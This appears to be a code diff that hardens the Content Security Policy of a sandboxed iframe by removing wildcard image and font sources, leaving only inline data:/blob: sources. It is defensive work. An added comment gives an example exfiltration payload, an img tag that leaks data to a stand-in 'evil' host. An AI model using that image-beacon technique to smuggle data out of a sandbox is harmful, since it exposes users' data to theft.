@@ -39,11 +39,15 @@ function buildSrcDoc(bundleCode: string): string {
   const cls = html.className || '';
   const colorTheme = html.dataset.colorTheme ? ` data-color-theme="${html.dataset.colorTheme}"` : '';
   const css = captureHostCss();
-  // CSP: the app may only render — no network of its own (connect-src 'none');
-  // its bridge is postMessage to the parent. Inline style + script are ours.
+  // CSP: the app may only render — NO network of its own. `connect-src 'none'`
+  // blocks fetch/XHR/WebSocket, but img/font loads are network too, so they're
+  // held to inline sources only (data:/blob:) — a wildcard there would be an
+  // exfil channel (`<img src="https://evil/?d=…">`) despite connect-src 'none'.
+  // The app's only egress is the postMessage bridge to the parent, which
+  // brokers tool + sqlite calls server-side. Inline style + script are ours.
   const csp =
     "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; " +
-    "img-src * data: blob:; font-src * data:; connect-src 'none'; base-uri 'none'; form-action 'none'";
+    "img-src data: blob:; font-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'";
   return `<!doctype html>
 <html class="${cls}"${colorTheme}>
 <head>
